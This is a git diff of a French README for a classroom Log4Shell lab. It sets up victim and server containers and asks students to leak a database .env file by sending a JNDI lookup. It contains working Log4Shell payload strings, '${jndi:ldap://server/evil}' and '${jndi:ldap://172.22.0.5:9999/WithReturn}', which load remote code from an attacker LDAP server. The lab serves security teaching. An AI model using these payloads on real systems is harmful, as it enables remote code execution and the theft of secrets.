@@ -25,14 +25,18 @@ Faire `cd log4shell` et ensuite `git clone https://github.com/Fabinhio25/TPLog4S
 
 Faire un `make all` pour créer tous les DockerFiles
 
-Après avoir fait le make, faire un `docker-compose up` dans le repertoire cloné.
+Après avoir fait le make all, faire un `docker-compose up` dans le repertoire cloné.
+Récupérer les IP de server et de victime dans la console quand docker-compose up est executé
+Victim_1 | Running on IP : XXX.XXX  
+Server_1 | Running on IP : XXX.XXX
+L'IP server sera a mettre dans le lookup plus tard
 
 Etapes à reproduire pour la réalisation du tp :
 
 Créer un fichier java dans lequel le code devra récupérer et écrire le .env de la base de données dans les logs du serveur.
 Appeler votre class java dans une requete faite au serveur, grace à un lookup vu en cours.
 
-Exemple de lookup : "${jndi:ldap://server/evil}"
+Exemple de lookup : "${jndi:ldap://172.22.0.5:9999/WithReturn}"
 
 ## Vous pourrez trouver des exemples d'attaques dans le fichier "attacker.java"
 
